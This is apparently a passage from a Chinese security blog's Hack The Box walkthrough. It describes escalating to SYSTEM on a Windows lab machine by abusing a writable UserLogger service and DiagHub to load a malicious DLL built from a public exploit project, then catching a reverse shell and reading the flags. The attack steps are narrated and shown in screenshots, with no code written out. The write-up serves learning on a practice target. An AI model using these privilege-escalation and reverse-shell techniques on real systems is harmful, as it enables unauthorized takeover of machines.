这台靶机已经把以上的方法都修补了... 但是靶机存在 UserLogger 可以利用写入 SYSTEM32，创建. log，并创建恶意 DLL 覆盖到. log 内，然后调用 DiagHub 进行加载执行 shellcode，从而提权...

制作恶意 dll，需要环境：

```
https://github.com/decoder-it/diaghub_exploit   ---下载源代码
```

```
https://blog.csdn.net/liubing8609/article/details/82695402
```

--- 安装 visual studio 2017 进行制作恶意 dll...  

记得本靶机已经存在 Applocker 应用控制策略，限制了大部分代码执行，开始吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicStoWjMBhO0vK0DOWmyUkb3Pu1nEdnOrkoNy1r1Lcv7V80plCYawyKCg/640?wx_fmt=png)

利用 diaghub_exploit 打开后，将 diaghub_exploit 生成，出错了... 找不到 SDK 版本选择 10.0.17134.0...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSyr9kKfMgDeFlHibk9OElCiacCoWCsDM4h0vTqEzxDbQTpR71VQKMCcRA/640?wx_fmt=png)

选择属性，出来界面 SDK 版本选择 17763 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSq04niao1ibclFMymcw9GO3MZ7h3yUXNV5BibZa9WszdK69cH8wPeIH2nw/640?wx_fmt=png)

Fakedll-- 属性，也要选择 17763...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSpWSCV0Sd36TBbj3KJ7VgXHiax7suFPxap9RCfpEwGfXGL3Qn4JZzVicg/640?wx_fmt=png)

diaghub_exploit-- 生成，成功生成了项目...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSkHOMDm7WGxcNREhFnHKHKJfeTj0US8CQNkbOIdKtk6jKGBgcbZ9NNA/640?wx_fmt=png)

Fakedll 重新生成库... 成功生成...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSic7uLoGPNaSzVQul00aAHsibpUpFTiczBN7PdBxFP8zElS0NbAp8PndJg/640?wx_fmt=png)

修改，重新生成即可... 这里提示的是写入的恶意 shellcode 的. bat 文件，需要执行的目录环境...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSI1BB2AZqMB6n7ZOeuxbkBPkAQjv3f1JanjkpZLVPGhyf0YYCm4xjvA/640?wx_fmt=png)修改，重新生成即可... 同理上

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS7soSCZPJtXSDeuDbyv0Tv9PkVeia35sKK7mSlOan3vtegibMaJbsjxicA/640?wx_fmt=png)

在 release 目录找到前面成功生成的两个项目文件...dia..exploit.exe 和 FakeDll.dll...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS0BKBherOqYWBD7OdRZL6zTROam8HRMic0ZOeuXaZgnh2fdODKfkriamw/640?wx_fmt=png)

简单的一句话 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSbjcPGyww039oxvB9UIQZdDr740lyXiaxqrLSOEFgbnD7fJ4767zbKvQ/640?wx_fmt=png)

利用 proxychain 的 tunnel 进行上传三个文件至 color 即可...（这里存在小坑！）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSiavWyicFbfEvonFDq36IKErYiamr5bnmYiaaJyB9ZclicrQ0P1UaYQaafYg/640?wx_fmt=png)

可看到 UserLogger 生成的 dayu.log 文件 byte58，当 copy 过来后增长了... 这是查看是否 copy 成功...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSTft2QRtmXLC4vC5ujaoYGXnic2Ce8FW77uWWGXLiawF2pGEq7iceFJM3g/640?wx_fmt=png)

可以看到这里遇到了很多坑... 我做了不下 5 次，创建了很多 exe 和 dll 去反复填坑测试... 遇到的坑我非常开心，都填满了...

这里执行即可...

然后查看端口服务是否开启...8888 端口成功启用了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSgmM2KibIAQWiaYGFeJPAic98AB9yLMdvL3qBQAPfuevAU4vWJs6s7COZQ/640?wx_fmt=png)

proxy nc 成功监听获得了反向外壳...system 管理员权限！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSeIyYESLzO4M4NfibibnyHkoJxKb2YG00KlpnekJEDQPlibM1JdakrsFiaw/640?wx_fmt=png)这里按照方法 1，我们已经知道含有数据流的坑... 前面也说了不需要利用 stream.exe 即可查看...

利用 powershell 自带功能，查看到了 root 文本位置...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS7Fz9f3XiagV62SibPJDXrffpictxEyIwXS0JL6cdUBYgg8KySvO9frCAg/640?wx_fmt=png)

查看即可... 还是一头驴...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSuDIfDLeen87NWSSnZR8Xfnj3icicOvz0gUD5TRAs8iaE9SsgLw2S01qwQ/640?wx_fmt=png)

前几篇文章也演示过 powershell 可以通过 / a /r 查看底层数据量...

成功获得 root,flag 信息...

通过 UserLogger 的可写可读利用，我相信这里还有很多种更简洁的方法可以利用... 期待

这里感谢 ippsec 大佬的帮助，在 proxychain3 ruby xxx.rb 这儿我卡了整整大半天，是因为 gem 的问题导致的...

这又是一篇非常难的靶机，由于 HTB 卡的问题，我都是凌晨大晚上才操作... 应该是反复做了 7 遍...

非常舒服，提升也很大，加油！！

这里推荐一个 ippsec 讲解的 AppLocker Bypass COR Profiler 绕过漏洞视频，我看完了，很 NICE...

```
https://www.youtube.com/watch?v=T91iXd_VPVI  --AppLocker Bypass COR Profiler ippsec
```

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台疯狂的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/tnNTe6QOaYx4HLiasWDSSibkvBwkySahn1jUGyrqSWWsCrd8WeibGicCbaDB9b5K4cTlaCxcmzv2uyEWNrQke47Vag/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)